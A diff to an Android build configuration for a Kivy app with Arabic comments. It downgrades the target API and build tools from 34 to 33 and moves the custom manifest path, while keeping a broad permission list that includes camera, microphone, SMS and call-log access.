@@ -19,19 +19,19 @@ requirements = python3, kivy==2.3.0, tflite-runtime==2.14.0, numpy==1.26.4, pill
 # ====== أيقونة التطبيق ======
 icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
 
-# ====== الصلاحيات (متوافقة مع Android 14) ======
+# ====== الصلاحيات (متوافقة مع Android 13/14) ======
 android.permissions = INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE, FOREGROUND_SERVICE_DATA_SYNC, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, READ_CALL_LOG
 
-# ====== إعدادات SDK/NDK (API 34 + NDK 25b) ======
-android.api = 34
+# ====== إعدادات SDK/NDK (API 33 + NDK 25b) – تم تغيير API إلى 33 لضمان التوفر في بيئة GitHub ======
+android.api = 33
 android.minapi = 26
-android.sdk = 34
+android.sdk = 33
 android.ndk = 25b
-android.build_tools_ver = 34.0.0
+android.build_tools_ver = 33.0.0
 android.accept_sdk_license = True
 
-# ====== ملف AndroidManifest.xml مخصص ======
-android.manifest = project/android/AndroidManifest.xml
+# ====== ملف AndroidManifest.xml مخصص – بعد نقل الملفات سيصبح في الجذر ======
+android.manifest = AndroidManifest.xml
 
 # ====== المعمارية المستهدفة (arm64-v8a فقط) ======
 android.archs = arm64-v8a
